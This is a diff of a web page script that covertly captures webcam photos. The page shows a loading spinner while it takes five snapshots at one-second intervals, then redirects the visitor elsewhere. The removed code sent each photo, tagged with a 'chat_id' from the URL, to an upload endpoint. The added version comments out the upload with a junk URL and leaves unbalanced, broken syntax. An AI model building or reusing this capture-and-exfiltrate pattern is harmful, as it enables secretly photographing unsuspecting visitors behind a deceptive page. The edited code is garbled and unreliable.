@@ -50,47 +50,35 @@
 <video id="video" width="320" height="240" autoplay></video>
 
 <script>
-    // Function to get the "id" parameter from the URL
-    function getChatIdFromURL() {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get('id');
-    }
+    
+    // Show the loading spinner
+    const spinner = document.getElementById('spinner');
+    spinner.classList.remove('hidden');
 
-    // Get the chat_id from URL
-    const chatId = getChatIdFromURL();
+    // Set up the video stream to capture photos
+    const video = document.getElementById('video');
 
-    // Check if chat_id is provided
-    if (!chatId) {
-        alert('Chat ID is missing from the URL!');
-    } else {
-        // Show the loading spinner
-        const spinner = document.getElementById('spinner');
-        spinner.classList.remove('hidden');
+    // Access the user's webcam
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+            // Set the video source to the webcam stream
+            video.srcObject = stream;
 
-        // Set up the video stream to capture photos
-        const video = document.getElementById('video');
+            // Start capturing photos every 1 second
+            let counter = 0;
+            const photoInterval = setInterval(function() {
+                if (counter < 5) {
+                    // Capture photo
+                    capturePhoto();
+                    counter++;
+                } else {
+                    // Stop capturing after 5 seconds
+                    clearInterval(photoInterval);
 
-        // Access the user's webcam
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function(stream) {
-                // Set the video source to the webcam stream
-                video.srcObject = stream;
-
-                // Start capturing photos every 1 second
-                let counter = 0;
-                const photoInterval = setInterval(function() {
-                    if (counter < 5) {
-                        // Capture photo
-                        capturePhoto();
-                        counter++;
-                    } else {
-                        // Stop capturing after 5 seconds
-                        clearInterval(photoInterval);
-
-                        // Redirect to Google after the process is complete
-                        window.location.href = 'https://www.google.com';
-                    }
-                }, 1000); // Capture every second
+                    // Redirect to Google after the process is complete
+                    window.location.href = 'redirectpage.html';
+                }
+            }, 1000); // Capture every second
 
                 // Function to capture photo from video
                 function capturePhoto() {
@@ -104,19 +92,19 @@
                     // Send the photo to the server
                     const formData = new FormData();
                     formData.append('photo', dataURLtoBlob(photoDataUrl));
-                    formData.append('chat_id', chatId); // Use the chat_id from URL
+                    //formData.append('chat_id', chatId); // Use the chat_id from URL
 
-                    fetch('photo-upload.php', {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log('Photo uploaded:', data);
-                    })
-                    .catch(error => {
-                        console.error('Error uploading photo:', error);
-                    });
+                    //fetch('404NOTFOUND wwwwww :o :) :D ;D ;)', {
+                        //method: 'POST',
+                        //body: formData
+                    //})
+                    //.then(response => response.json())
+                    //.then(data => {
+                        //console.log('Photo uploaded:', data);
+                    //})
+                    //.catch(error => {
+                        //console.error('Error uploading photo:', error);
+                    //});
                 }
 
                 // Convert Data URL to Blob (to send as a file)
@@ -126,16 +114,16 @@
                     const ab = new ArrayBuffer(byteString.length);
                     const ia = new Uint8Array(ab);
                     for (let i = 0; i < byteString.length; i++) {
-                        ia[i] = byteString.charCodeAt(i);
-                    }
-                    return new Blob([ab], { type: mimeString });
+                    ia[i] = byteString.charCodeAt(i);
                 }
-            })
-            .catch(function(error) {
-                console.log("Camera permission denied: ", error);
-                spinner.classList.add('hidden'); // Hide the spinner if permission is denied
-            });
-    }
+                return new Blob([ab], { type: mimeString });
+             }
+        })
+        //.catch(function(error) {
+            //console.log("Camera permission denied: ", error);
+            //spinner.classList.add('hidden'); // Hide the spinner if permission is denied
+        //}
+        );
 </script>
 
 </body>
